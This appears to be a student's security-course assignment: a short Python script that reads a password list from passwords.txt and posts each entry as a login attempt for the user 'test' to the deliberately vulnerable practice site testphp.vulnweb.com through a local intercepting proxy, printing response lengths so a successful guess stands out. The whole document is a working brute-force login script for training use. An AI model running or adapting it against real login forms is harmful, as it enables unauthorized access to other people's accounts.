# NIAIS-
Assignment 2
```python
#!/usr/bin/env python3
import requests 
import urllib.parse

def send_request(password):
	username = 'test'
	target_url = "http://testphp.vulnweb.com/userinfo.php"
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	data = { 'uname': username, 'pass': password }
	#encoded_data = urllib.parse.urlencode(data)
	proxy = {"http": "http://127.0.0.1:8080"}
	response = requests.post(target_url, data=data, proxies=proxy)
	# print(response.status_code)
	print("Username: %s Password: %s Response: %s Code: %s" % (username, password, len(response.text), response.status_code))

def read_passwords_file():
	file = 'passwords.txt'
	with open(file, 'r') as passwords:
		for password in passwords.readlines():
			send_request(password.replace("\n", ""))

if __name__ == '__main__':
	read_passwords_file()
  ```
